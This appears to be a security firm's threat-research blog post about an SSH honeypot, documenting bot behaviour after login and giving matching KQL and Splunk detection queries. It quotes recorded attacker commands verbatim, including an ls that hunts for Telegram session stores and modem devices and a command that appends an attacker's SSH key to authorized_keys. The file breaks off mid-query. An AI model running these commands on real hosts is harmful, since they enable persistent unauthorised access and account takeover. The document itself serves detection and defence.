@@ -1,0 +1,344 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>What SSH Bots Do After Login: Anti-Honeypot Checks, GPU Sizing and SMS-Modem Hunting | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/ssh-bots-after-login-fingerprinting/">
+<meta name="description" content="Our SSH honeypot accepted any password for 40 decoy accounts. 3,412 logins later, the bots showed exactly what they do first: a six-test anti-honeypot kit tagged with random 32-hex tokens, GPU and miner sizing aimed at Solana-style accounts, and an SMS-modem and Telegram-session hunting kit. Every command, how the kits were attributed, and tested MDE + Sentinel and Splunk + CrowdStrike detections.">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/ssh-bots-after-login-fingerprinting/">
+<meta property="og:title" content="What SSH Bots Do After Login: Anti-Honeypot Checks, GPU Sizing and SMS-Modem Hunting | Global SOC">
+<meta property="og:description" content="Our SSH honeypot accepted any password for 40 decoy accounts. 3,412 logins later, the bots showed exactly what they do first: a six-test anti-honeypot kit tagged with random 32-hex tokens, GPU and miner sizing aimed at Solana-style accounts, and an SMS-modem and Telegram-session hunting kit. Every command, how the kits were attributed, and tested MDE + Sentinel and Splunk + CrowdStrike detections.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="What SSH Bots Do After Login: Anti-Honeypot Checks, GPU Sizing and SMS-Modem Hunting | Global SOC">
+<meta name="twitter:description" content="Our SSH honeypot accepted any password for 40 decoy accounts. 3,412 logins later, the bots showed exactly what they do first: a six-test anti-honeypot kit tagged with random 32-hex tokens, GPU and miner sizing aimed at Solana-style accounts, and an SMS-modem and Telegram-session hunting kit. Every command, how the kits were attributed, and tested MDE + Sentinel and Splunk + CrowdStrike detections.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/ssh-bots-after-login-fingerprinting/#article",
+      "url": "https://globalsoc.com.au/blog/ssh-bots-after-login-fingerprinting/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/ssh-bots-after-login-fingerprinting/"
+      },
+      "headline": "After the Password Works: SSH Bots That Test Your Shell, Size Your GPU and Hunt for SMS Modems",
+      "description": "Our SSH honeypot accepted any password for 40 decoy accounts. 3,412 logins later, the bots showed exactly what they do first: a six-test anti-honeypot kit tagged with random 32-hex tokens, GPU and miner sizing aimed at Solana-style accounts, and an SMS-modem and Telegram-session hunting kit. Every command, how the kits were attributed, and tested MDE + Sentinel and Splunk + CrowdStrike detections.",
+      "datePublished": "2026-11-27",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "After the Password Works: SSH Bots That Test Your Shell, Size Your GPU and Hunt for SMS Modems",
+          "item": "https://globalsoc.com.au/blog/ssh-bots-after-login-fingerprinting/"
+        }
+      ]
+    }
+  ]
+}
+</script>
+<meta property="article:published_time" content="2026-11-27">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="author" content="Yogesh">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f5f7fa;color:#142333;font:17px/1.75 system-ui,sans-serif}
+header{background:#0b2436;color:white;padding:25px max(24px,calc((100vw - 1000px)/2))}
+header a{color:#a6e3ff;text-decoration:none}
+header a:hover{text-decoration:underline}
+main{max-width:1000px;margin:auto;padding:40px 24px 80px}
+h1{font-size:clamp(34px,5vw,52px);line-height:1.15;letter-spacing:-.035em;margin:16px 0 20px}
+h2{margin-top:52px;line-height:1.3;font-size:28px;border-bottom:1px solid #d6e1e9;padding-bottom:8px}
+h3{margin-top:32px;font-size:20px}
+p{max-width:82ch;margin:16px 0}
+pre{background:#10283a;color:#e3f2fc;padding:20px;border-radius:10px;overflow:auto;font:13.5px/1.65 Consolas,monospace;white-space:pre-wrap;overflow-wrap:anywhere}
+code{font-family:Consolas,monospace;background:#e9f0f5;color:#0b2436;padding:2px 6px;border-radius:4px;font-size:0.9em}
+pre code{background:transparent;color:inherit;padding:0}
+a{color:#076383}
+nav.toc{background:#e6f0f5;border-left:4px solid #087da4;padding:16px 22px;margin:24px 0}
+.meta{color:#47687c;font-size:14px;font-weight:600;letter-spacing:0.04em}
+table{width:100%;border-collapse:collapse;background:white;font-size:15px;margin:20px 0}
+td,th{padding:12px;border:1px solid #d6e1e9;text-align:left}
+th{background:#edf3f7}
+td code{overflow-wrap:anywhere}
+.alert-box{background:#f0fdf4;border-left:4px solid #16a34a;padding:16px 20px;border-radius:4px;margin:20px 0}
+.warn-box{background:#fef2f2;border-left:4px solid #dc2626;padding:16px 20px;border-radius:4px;margin:20px 0}
+@media(max-width:640px){table{font-size:12px}td,th{padding:6px}}
+.bar{fill:#087da4}.small{font-size:14px;color:#47687c}
+.org{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:6px;letter-spacing:.03em;vertical-align:1px}
+.orgA{background:#fde7d9;color:#7a2e0b}.orgB{background:#dbeafe;color:#1e3a8a}
+.kc{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:8px;background:#0b2436;color:#a6e3ff;vertical-align:3px;letter-spacing:.03em}
+ul,ol{max-width:82ch}li{margin:6px 0}
+</style>
+</head>
+<body>
+<header>
+  <div style="display:flex;justify-content:space-between;align-items:center;">
+    <div><a href="/">Global SOC</a> / <a href="/blog/">Blog</a></div>
+    <div><a href="/dnsaudit/">DNS Audit</a></div>
+  </div>
+</header>
+<main>
+<p class="meta">THREAT RESEARCH &amp; LABS · Yogesh · 27 November 2026</p>
+<h1>After the Password Works: SSH Bots That Test Your Shell, Size Your GPU and Hunt for SMS Modems</h1>
+<p>Our SSH honeypot accepted any password for 40 decoy accounts. 3,412 logins later, the bots showed exactly what they do first: a six-test anti-honeypot kit tagged with random 32-hex tokens, GPU and miner sizing aimed at Solana-style accounts, and an SMS-modem and Telegram-session hunting kit. Every command, how the kits were attributed, and tested MDE + Sentinel and Splunk + CrowdStrike detections.</p>
+<nav class="toc"><strong>Key Sections:</strong> Where the Data Came From · Playbook 1: Is This a Honeypot? · Playbook 2: Is It Worth Mining? · Playbook 3: SMS Modems and Telegram · Playbook 4: Plant a Key · Kill Chain · Pyramid of Pain · Detections · When It Fires · IOCs</nav>
+<p class="small">Data window: 29 October – 11 November 2026, the same Cisco ASA honeypot as the <a href="/blog/ssh-tunnel-proxy-abuse-honeypot/">SSH tunnel post</a>. Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Microsoft Defender for Endpoint with Microsoft Sentinel; queries marked <em>Tested</em> ran against this honeypot's MDE data. <span class="org orgB">Org B</span> runs Splunk with CrowdStrike Falcon (Event Search field names); its queries were not run against this data.</p>
+
+<h2 id="data">1. Where the Data Came From</h2>
+<p>PAM on the honeypot accepted any password for 40 decoy accounts (<code>admin</code>, <code>ubuntu</code>, <code>user</code>, <code>deploy</code>, <code>test</code>, <code>postgres</code>, <code>sol</code>, <code>validator</code>, <code>tradingbot</code> and so on), and the login shell for each was a Python fake shell. That produced 3,412 successful logins (3,402 <code>password</code>, 10 <code>keyboard-interactive/pam</code>). Three sources recorded what happened next:</p>
+<table><thead><tr><th>Source</th><th>What it captured</th><th>Gap</th></tr></thead><tbody>
+<tr><td>Fake-shell log (<code>ssh_post_auth_commands.jsonl</code>)</td><td>2,103 interactive commands from 9 IPs, all as <code>admin</code></td><td>The file was created by the first session and, on the disk image, is owned by uid 1037 (<code>admin</code>) with mode <code>0644</code> (<code>-rw-r--r-- 1 1037 nogroup</code>). Every later session runs as its own user, so no other account could append. It also only logged interactive input, not exec requests.</td></tr>
+<tr><td>MDE <code>DeviceProcessEvents</code></td><td>About 1,300 exec-mode commands (<code>ssh user@host "cmd"</code>) across 31 accounts, as the argument of <code>cisco-fake-shell -c "&lt;cmd&gt;"</code></td><td>Interactive lines typed into the fake shell are stdin, not processes, so MDE can't see them.</td></tr>
+<tr><td><code>auth.log</code> + MDE <code>DeviceLogonEvents</code></td><td>Every login: account, source IP, time, session length</td><td>No commands.</td></tr>
+</tbody></table>
+<p>The two command sources are complementary: the honeypot log has the interactive anti-honeypot kit, MDE has the exec-mode recon. Neither alone shows the whole picture. Exec commands were attributed to a source IP by matching each one to the same account's SSH logon in the preceding 15 seconds (848 of 1,298 process records matched; scripted bots run their first command within a second or two). Treat those attributions as strong correlation, not proof.</p>
+<p>Session length tells you these are scripts: of the accepted logins with a clean start and end, 1,906 lasted 1–5 seconds, 1,391 lasted 5–20 seconds, and only 16 lasted more than a minute.</p>
+
+<h2 id="kit1">2. Playbook 1: "Is this a honeypot?"</h2>
+<p>Nine IPs (<code>2.57.122[.]150</code>, <code>2.57.122[.]209</code>, <code>2.57.122[.]76</code>, <code>2.57.122[.]168</code>, <code>195.178.110[.]228</code>, <code>80.94.92[.]55</code>, <code>80.94.92[.]234</code>, <code>92.118.39[.]77</code>, <code>92.118.39[.]49</code>) logged in as <code>admin</code>, opened an interactive shell, and sent the six tests twice, each block under its own token, followed by a transport marker: 13 lines in 2.3 milliseconds. This is the first block of the first session from <code>195.178.110[.]228</code> (22:00:01 UTC, 29 October) plus the closing marker; the second block is identical except for its token (<code>check_677f3ee5d8c6657e3c44dc5ed3dbd6f1</code>):</p>
+<pre><code>sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_feb6f67c69351db213e7c455636034cf_small_control'"'"' '"'"'check_feb6f67c69351db213e7c455636034cf'"'"''
+sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_feb6f67c69351db213e7c455636034cf_small_math'"'"' "$((402*668+23))"'
+sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_feb6f67c69351db213e7c455636034cf_small_pid'"'"' "$$"'
+sh -c 'set -- '"'"'check_feb6f67c69351db213e7c455636034cf_arg1'"'"' '"'"'check_feb6f67c69351db213e7c455636034cf_arg2'"'"'; printf '"'"'\n%s|%s\n'"'"' '"'"'check_feb6f67c69351db213e7c455636034cf_small_positional'"'"' "$#|$1|$2"'
+sh -c 'f_check_feb6f67c69351db213e7c455636034cf() { printf '"'"'\n%s|%s\n'"'"' '"'"'check_feb6f67c69351db213e7c455636034cf_small_function'"'"' "$1|$#"; }; f_check_feb6f67c69351db213e7c455636034cf '"'"'check_feb6f67c69351db213e7c455636034cf_function_value'"'"''
+sh -c 'printf '"'"'\n%s\n'"'"' '"'"'check_feb6f67c69351db213e7c455636034cf_small_done'"'"''
+echo; echo 'check_700847ec050075ea73e058d3713539db_transport_done'</code></pre>
+<p>What each test proves, and what a real <code>/bin/sh</code> prints:</p>
+<table><thead><tr><th>Test</th><th>Construct</th><th>Real shell output</th><th>What it defeats</th></tr></thead><tbody>
+<tr><td><code>small_control</code></td><td>Plain <code>printf</code> of the token</td><td><code>check_…_small_control|check_…</code></td><td>Baseline: is output reflected at all, and is <code>'"'"'</code> quote nesting parsed?</td></tr>
+<tr><td><code>small_math</code></td><td><code>$((402*668+23))</code> with random operands</td><td><code>268559</code></td><td>Canned-response honeypots. The answer changes every session, so a lookup table can't pass.</td></tr>
+<tr><td><code>small_pid</code></td><td><code>"$$"</code></td><td>A plausible PID</td><td>Shells that don't expand special parameters.</td></tr>
+<tr><td><code>small_positional</code></td><td><code>set -- a b; "$#|$1|$2"</code></td><td><code>2|…_arg1|…_arg2</code></td><td>Emulators that can't hold shell state across a statement.</td></tr>
+<tr><td><code>small_function</code></td><td>Define and call a function</td><td><code>…_function_value|1</code></td><td>Pattern-matching shells (Cowrie-style command tables) without a real parser.</td></tr>
+<tr><td><code>small_done</code> / <code>transport_done</code></td><td>Terminator markers</td><td>The marker</td><td>Tells the client the channel delivered every line, so a missing answer is the shell's fault, not the network's.</td></tr>
+</tbody></table>
+<p>Every token is a fresh 32-hex value per session, and each bot reconnected about every two minutes with a new token (22:00:01, 22:02:15, 22:04:16, 22:06:32 for <code>195.178.110[.]228</code>). Echoing the token doesn't help a honeypot: the test is whether the <em>computation around</em> the token is right. My fake shell had canned answers for a handful of commands (<code>echo</code>, <code>id</code>, <code>whoami</code>, <code>uname</code>, <code>pwd</code>, <code>ls</code>, <code>show version</code>, <code>/proc/cpuinfo</code>, <code>/proc/mounts</code>), but every test arrived wrapped in <code>sh -c '...'</code>, which it doesn't parse. It answered only the bare <code>echo; echo '…_transport_done'</code> line, so it failed all six tests in every session. None of these nine IPs ever sent a download command. The kit is a gate: fail it and the bot moves on, which is why a low-interaction SSH honeypot collects passwords but very few payloads.</p>
+
+<h2 id="kit2">3. Playbook 2: "Is it worth mining?"</h2>
+<p>About 630 GPU-probe commands across accounts named for crypto infrastructure (<code>sol</code>, <code>validator</code>, <code>trading</code>, <code>tradingbot</code>) as well as generic ones (<code>ubuntu</code>, <code>docker</code>, <code>ftp</code>, <code>teamspeak</code>, <code>oracle</code>, <code>centos</code>). Each session ran the same fixed set, one SSH exec per command:</p>
+<pre><code>uname -s -v -n -r -m
+uname -m | awk '{printf $1}'
+uptime -p
+lspci | grep VGA | cut -f5- -d ' '
+lspci | grep VGA -c
+lspci | grep "3D controller" | cut -f5- -d ' '
+nvidia-smi -q | grep "Product Name" | head -n 1 | awk '{print $4, $5, $6, $7, $8, $9, $10, $11}'
+nvidia-smi -q | grep "Product Name" | awk '{print $4, $5, $6, $7, $8, $9, $10, $11}' | grep . -c</code></pre>
+<p>Counts across the whole window, one per SSH exec (unique process IDs): <code>uname -s -v -n -r -m</code> 333, <code>uname -m | awk…</code> 299, <code>lspci … VGA … cut</code> 116, <code>uptime -p</code> 107, <code>lspci | grep VGA -c</code> 102, <code>lspci "3D controller"</code> 101, both <code>nvidia-smi</code> lines 102 each. (The fake shell starts with <code>#!/usr/bin/env python3</code>, so MDE often logs each exec twice under the same PID, once as <code>env</code> and once as <code>python3.10</code>. Count PIDs, not rows.) "3D controller" is how datacentre GPUs (NVIDIA A100/H100 class) enumerate on PCI, as opposed to "VGA" for consumer cards, and the second <code>nvidia-smi</code> line counts the GPUs. <code>uptime -p</code> answers "is this a short-lived sandbox?". The kit is sizing the host for GPU mining or for resale as GPU compute. The account names show the target list was built for Solana validators and trading bots, the servers most likely to have both GPUs and wallets.</p>
+<p>Time-correlated sources (logon of the same account within 15 s): <code>103.159.2[.]113</code> 125 commands, <code>179.43.153[.]18</code> 110, <code>2.57.122[.]238</code> 82, <code>195.178.110[.]26</code> 80, <code>209.99.190[.]186</code> 26. A shorter variant (<code>nproc</code>, <code>uname -m</code>, <code>lspci | egrep VGA &amp;&amp; lspci | grep 3D</code>) ran 20 times each in 102 seconds (03:09:40–03:11:22 UTC) on 3 November across <code>oracle</code>, <code>mysql</code>, <code>git</code>, <code>pi</code>, <code>jenkins</code>, <code>zabbix</code> and others, from <code>79.175.176[.]177</code>.</p>
+<p>The plain <code>uname</code> probes came mostly from the brute-force workers themselves: <code>109.160.32[.]105</code>, <code>.160</code>, <code>.200</code>, <code>.37</code>, <code>.40</code>, <code>.104</code> and <code>77.239.124[.]34</code>, <code>.35</code>, <code>.38</code>, <code>.148</code>. That is the guesser confirming a hit with one harmless command before it reports the credential upstream.</p>
+
+<h2 id="kit3">4. Playbook 3: SMS modems and Telegram sessions</h2>
+<p>A separate kit: five sessions as <code>admin</code> and <code>test</code> between 2 and 11 November, eight commands per session, 40 in total (the 2 November session time-correlates to <code>191.180.161[.]164</code>). One <code>ls</code> lists every location that matters for SMS fraud or account takeover:</p>
+<pre><code>ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*</code></pre>
+<table><thead><tr><th>Path</th><th>Why an attacker wants it</th></tr></thead><tbody>
+<tr><td><code>TelegramDesktop/tdata</code></td><td>Telegram Desktop's session store. Copying it hijacks the logged-in Telegram account without a password or 2FA code.</td></tr>
+<tr><td><code>/dev/ttyGSM*</code>, <code>/dev/ttyUSB-mod*</code>, <code>/dev/modem*</code></td><td>GSM/LTE modem serial devices: send SMS, read inbound OTP codes.</td></tr>
+<tr><td><code>/var/spool/sms/*</code>, <code>/etc/smsd.conf*</code>, <code>/var/log/smsd.log</code></td><td>smstools3 SMS gateway spool, config and log: stored messages and the modem config.</td></tr>
+<tr><td><code>/usr/bin/qmuxd</code>, <code>/var/qmux_connect_socket</code></td><td>Qualcomm QMI multiplexer used by cellular modules in routers and IoT gateways.</td></tr>
+<tr><td><code>/etc/config/simman</code>, <code>/var/config/sms/*</code></td><td>SIM-manager and SMS config on industrial cellular routers (OpenWrt-based).</td></tr>
+</tbody></table>
+<p>The same sessions also ran <code>ps | grep '[Mm]iner'</code> and <code>ps -ef | grep '[Mm]iner'</code> (is a competitor already mining here?), <code>locate D877F783D5D3EF8Cs</code> (a fixed marker string, either a file a previous infection leaves or a deliberate canary), <code>echo Hi | cat -n</code> (a pipe test, the same idea as Playbook 1), <code>ifconfig</code>, <code>uname -a</code> and <code>cat /proc/cpuinfo</code>, once per session. (A separate <code>echo SHELL_TEST</code> probe ran five times on 7–8 November as <code>admin</code>, <code>support</code> and <code>test</code>, time-correlated to <code>35.187.231[.]181</code>.) The kit wants three things from one login: a modem to monetise, a Telegram session to steal, and a CPU nobody else is mining on.</p>
+
+<h2 id="kit4">4b. Playbook 4: plant a key</h2>
+<p>Two identical execs on 11 November, at 14:10:36 and 19:59:35 UTC, both as <code>ubuntu</code>, tried to make the access permanent. MDE recorded the command verbatim (the <code>****</code> is as logged):</p>
+<pre><code>uname -a &amp;&amp; nproc &amp;&amp; sh -c 'cd ~ &amp;&amp; \
+mkdir -p **** &amp;&amp; \
+chattr -i .ssh 2&gt;/dev/null || true &amp;&amp; \
+cd .ssh &amp;&amp; \
+chattr -i authorized_keys 2&gt;/dev/null || true &amp;&amp; \
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3crWsao+ctzbToLa7oSGyaldBFuTTRTFVk9A106sesz/d5UXOYJmXl9iDe2IX6FfEE+XQmEIJ0RS9DBrdmhR36a8uFGAI8x0FjB3FmAmaTg+BM6Yamhxepv+AS4mCwYtDUFjNmqAjFXZqraWmVGNGgdCDpcK8LpRDierLMZ98uIpsaFvqHixq0stTu+AyynD3JD4oF+eFxfn+Rvw2HtW0LTd0TEq+ZYdTG80/MVhvlgJ61L9PlsiAQWbVeps8cMA1Xj1UNMJ9JzlBRCcWYKn00RmEuwzzhMejX82gEnXuY5DL8VpZjI90a6lmuaqfqtbRsiG/rG0c8oTEgpEEPJ1z $(whoami)@$(hostname)" &gt;&gt; authorized_keys &amp;&amp; \
+chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys'</code></pre>
+<p>Three details make it a good detection anchor. <code>chattr -i</code> on <code>.ssh</code> and <code>authorized_keys</code> removes the immutable flag a <em>previous</em> intruder may have set to lock others out. The key comment is generated on the victim (<code>$(whoami)@$(hostname)</code>), so the line looks like a normal user key in the file. And the <code>uname -a &amp;&amp; nproc</code> prefix is the same sizing step as Playbook 2, fused into one exec. Key fingerprint: <code>SHA256:sbTUqMHiIZ3gLrJKR2zACW5y9JdUKzEr0XzwF9tgR2I</code> (MD5 <code>fe:13:7c:98:d9:d1:b0:6a:71:3a:72:af:15:f0:da:da</code>). The fake shell executed none of it.</p>
+
+<h2 id="chain">5. Kill Chain</h2>
+<h3><span class="kc">Credential Access</span> Guess the password</h3>
+<p>Distributed wordlist workers (<code>109.160.32[.]0/24</code>, <code>77.239.124[.]0/24</code>, <code>2.57.122[.]0/24</code>, <code>45.148.10[.]0/24</code>). T1110.001.</p>
+<h3><span class="kc">Initial Access</span> Log in</h3>
+<p>T1078.003 Valid Accounts: Local Accounts, T1021.004 SSH.</p>
+<h3><span class="kc">Defense Evasion</span> Test the shell before trusting it</h3>
+<p>Playbook 1. T1497 Virtualization/Sandbox Evasion (the honeypot is the sandbox), executed via T1059.004 Unix Shell.</p>
+<h3><span class="kc">Discovery</span> Size the host</h3>
+<p>Playbook 2 and the <code>uname</code>/<code>/proc/cpuinfo</code>/<code>uptime</code> lines of Playbook 3. T1082 System Information Discovery, T1057 Process Discovery (<code>ps | grep miner</code>), T1120 Peripheral Device Discovery (<code>lspci</code>, <code>/dev/ttyGSM*</code>), T1083 File and Directory Discovery.</p>
+<h3><span class="kc">Collection</span> Look for sessions and messages</h3>
+<p>Playbook 3. T1005 Data from Local System (<code>tdata</code>, SMS spool); on a real host the next step is T1539 Steal Web Session Cookie (Telegram session) and T1111 Multi-Factor Authentication Interception (inbound OTP over the modem).</p>
+<h3><span class="kc">Actions on Objectives</span> Never reached here</h3>
+<p>Playbook 4 is T1098.004 SSH Authorized Keys, preceded by T1222.002 (<code>chattr -i</code>). The fake shell failed Playbook 1 and returned nothing for the exec probes, so no host reached the "drop the miner" step. On a real server the next commands are well documented: <code>wget</code>/<code>curl</code> a dropper into <code>/tmp</code> or <code>/dev/shm</code>, <code>chmod +x</code>, run, add an <code>authorized_keys</code> line (see the <a href="/blog/detect-redtail-cryptominer/">RedTail post</a>).</p>
+
+<h2 id="pyramid">6. Pyramid of Pain</h2>
+<table><thead><tr><th>Level</th><th>Indicator</th><th>Durability</th></tr></thead><tbody>
+<tr><td>IP addresses</td><td>The 9 kit IPs, the GPU-sizing sources, the worker <code>/24</code>s</td><td>Low. Rented and rotated.</td></tr>
+<tr><td>Host artefacts</td><td>Token format <code>check_&lt;32 hex&gt;_small_&lt;test&gt;</code>, <code>f_check_&lt;hex&gt;()</code>, <code>locate D877F783D5D3EF8Cs</code></td><td>Medium-high. Changing it means changing the tool; the format was identical across all nine IPs for the 4.6 days the shell log covered (29 Oct 22:00 – 3 Nov 11:46 UTC).</td></tr>
+<tr><td>Tools</td><td>The six-test shell-semantics kit; the fixed 8-command GPU sizing set; the one-line SMS/Telegram <code>ls</code></td><td>High. Detect the set, not one command.</td></tr>
+<tr><td>TTPs</td><td>Login &rarr; sandbox test &rarr; hardware sizing &rarr; (drop) within seconds; one SSH exec per command; reconnect every ~2 min</td><td>Highest. A human admin doesn't run <code>nvidia-smi</code>, <code>lspci</code>, <code>uptime -p</code> and <code>uname -svnrm</code> as four separate SSH sessions within a second of logging in.</td></tr>
+</tbody></table>
+
+<h2 id="detect">7. Detections</h2>
+
+<h3>D1. The anti-honeypot kit (T1497, T1059.004)</h3>
+<p><span class="org orgA">Org A</span> Tested: 0 rows, and correctly so. The fake shell read these lines from stdin, so no process was created. On a real host each test is an <code>sh -c</code> process and this fires on the first session.</p>
+<pre><code>// A1: the anti-honeypot check kit (token check_&lt;32 hex&gt;_small_&lt;test&gt; or _transport_done)
+DeviceProcessEvents
+| where Timestamp &gt; ago(30d)
+| where ProcessCommandLine matches regex @"check_[0-9a-f]{32}_(small_(control|math|pid|positional|function|done)|transport_done|arg[12]|function_value)"
+| summarize Commands = count(), Tests = make_set(extract(@"check_[0-9a-f]{32}_([a-z_0-9]+)", 1, ProcessCommandLine), 12),
+            Tokens = dcount(extract(@"check_([0-9a-f]{32})", 1, ProcessCommandLine))
+          by DeviceName, AccountName, bin(Timestamp, 10m)</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>`comment("B1: Falcon - anti-honeypot check kit tokens")`
+event_simpleName=ProcessRollup2 event_platform=Lin
+| regex CommandLine="check_[0-9a-f]{32}_(small_(control|math|pid|positional|function|done)|transport_done|arg[12]|function_value)"
+| rex field=CommandLine "check_(?&lt;token&gt;[0-9a-f]{32})_(?&lt;test&gt;[a-z_0-9]+)"
+| bin _time span=10m
+| stats count as cmds values(test) as tests dc(token) as tokens by _time aid ComputerName UserName</code></pre>
+<p>The regex is narrow enough to run as a near-real-time rule. A real <code>/bin/sh</code> never produces this token format on its own.</p>
+
+<h3>D2. GPU and miner sizing burst (T1082, T1120)</h3>
+<p><span class="org orgA">Org A</span> Tested: 108 one-minute windows across 15 accounts, 29 Oct 23:35 – 10 Nov 18:24 UTC. Every window had three or more distinct probes.</p>
+<pre><code>// A2: GPU / miner sizing burst after an SSH login
+DeviceProcessEvents
+| where Timestamp &gt; ago(30d)
+| where ProcessCommandLine has_any ("nvidia-smi", "lspci", "uptime -p", "nproc")
+| extend Probe = case(ProcessCommandLine has "nvidia-smi", "nvidia-smi",
+                      ProcessCommandLine has "3D controller", "lspci-3d",
+                      ProcessCommandLine has "VGA", "lspci-vga",
+                      ProcessCommandLine has "uptime -p", "uptime-p", "nproc")
+| summarize Probes = dcount(Probe), ProbeSet = make_set(Probe), Cmds = count() by DeviceName, AccountName, bin(Timestamp, 1m)
+| where Probes &gt;= 3</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>`comment("B2: Falcon - GPU / miner sizing burst")`
+event_simpleName=ProcessRollup2 event_platform=Lin (CommandLine="*nvidia-smi*" OR CommandLine="*lspci*" OR CommandLine="*uptime -p*" OR CommandLine="*nproc*")
+| eval probe=case(like(CommandLine,"%nvidia-smi%"),"nvidia-smi", like(CommandLine,"%3D controller%"),"lspci-3d",
+                  like(CommandLine,"%VGA%"),"lspci-vga", like(CommandLine,"%uptime -p%"),"uptime-p", true(),"nproc")
+| bin _time span=1m
+| stats dc(probe) as probes values(probe) as probe_set count by _time aid ComputerName UserName
+| where probes&gt;=3</code></pre>
+<p>On real GPU hosts, monitoring agents run <code>nvidia-smi</code> constantly. Exclude them by parent process (<code>dcgm-exporter</code>, <code>nvidia-persistenced</code>, your metrics agent) and keep the condition that <code>lspci</code> and <code>uptime -p</code> appear in the same minute.</p>
+
+<h3>D3. SMS-modem and Telegram-session hunting (T1005, T1120)</h3>
+<p><span class="org orgA">Org A</span> Tested: 10 process records, accounts <code>admin</code> and <code>test</code>, 2–11 November (five sessions; MDE records both the <code>env</code> and the <code>python3</code> process for each command, so expect two rows per command on hosts with interpreter wrappers).</p>
+<pre><code>// A3: SMS-modem / Telegram-session hunting kit
+DeviceProcessEvents
+| where Timestamp &gt; ago(30d)
+| where ProcessCommandLine has_any ("TelegramDesktop/tdata", "/dev/ttyGSM", "/dev/ttyUSB-mod", "/var/spool/sms",
+                                    "smsd.conf", "smsd.log", "qmuxd", "qmux_connect_socket", "/etc/config/simman", "/dev/modem")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>`comment("B3: Falcon - SMS modem / Telegram session hunting")`
+event_simpleName=ProcessRollup2 event_platform=Lin
+  (CommandLine="*TelegramDesktop/tdata*" OR CommandLine="*/dev/ttyGSM*" OR CommandLine="*/var/spool/sms*"
+   OR CommandLine="*smsd.conf*" OR CommandLine="*qmuxd*" OR CommandLine="*/etc/config/simman*" OR CommandLine="*/dev/modem*")
+| table _time ComputerName UserName CommandLine ParentBaseFileName</code></pre>
+<p>Almost zero false positives on servers. On an actual SMS gateway, exclude the smstools daemon user.</p>
+
+<h3>D4. Rival-miner and marker checks (T1057)</h3>
+<p><span class="org orgA">Org A</span> Tested: 8 five-minute windows, accounts <code>admin</code> and <code>test</code>.</p>
+<pre><code>// A4: rival-miner and marker checks that the same kit runs
+DeviceProcessEvents
+| where Timestamp &gt; ago(30d)
+| where ProcessCommandLine has_any ("grep '[Mm]iner'", "locate D877F783D5D3EF8Cs", "echo Hi | cat -n")
+| summarize Cmds = count(), Set = make_set(ProcessCommandLine, 10) by DeviceName, AccountName, bin(Timestamp, 5m)</code></pre>
+
+<h3>D5. Seconds-long scripted sessions across many accounts</h3>
+<p><span class="org orgA">Org A</span> (Sentinel Syslog; not run, because this honeypot's auth logs were not forwarded to Sentinel. The same shape is visible in the auth.log numbers in section 1.)</p>
+<pre><code>// A5 (Sentinel Syslog): logins that live for seconds - scripted check sessions, many accounts
+Syslog
+| where ProcessName == "sshd"
+| extend Src = extract(@"Accepted \S+ for \S+ from (\S+)", 1, SyslogMessage),
+         User = extract(@"Accepted \S+ for (\S+) from", 1, SyslogMessage)
+| summarize Start = min(TimeGenerated), End = max(TimeGenerated), Src = take_anyif(Src, isnotempty(Src)), User = take_anyif(User, isnotempty(User))
+          by Computer, ProcessID
+| where isnotempty(Src)
+| extend Secs = datetime_diff("second", End, Start)
+| summarize Sessions = count(), ShortSessions = countif(Secs &lt;= 20), Users = dcount(User) by Computer, Src, bin(Start, 1h)
+| where ShortSessions &gt;= 5</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>`comment("B4: Splunk linux_secure - seconds-long scripted SSH sessions across many accounts")`
+index=linux sourcetype=linux_secure process=sshd
+| rex "sshd\[(?&lt;pid&gt;\d+)\]"
+| rex "Accepted \S+ for (?&lt;user&gt;\S+) from (?&lt;src&gt;\S+)"
+| stats min(_time) as start max(_time) as end values(src) as src values(user) as user by host pid
+| where isnotnull(src)
+| eval secs=end-start
+| bin start span=1h
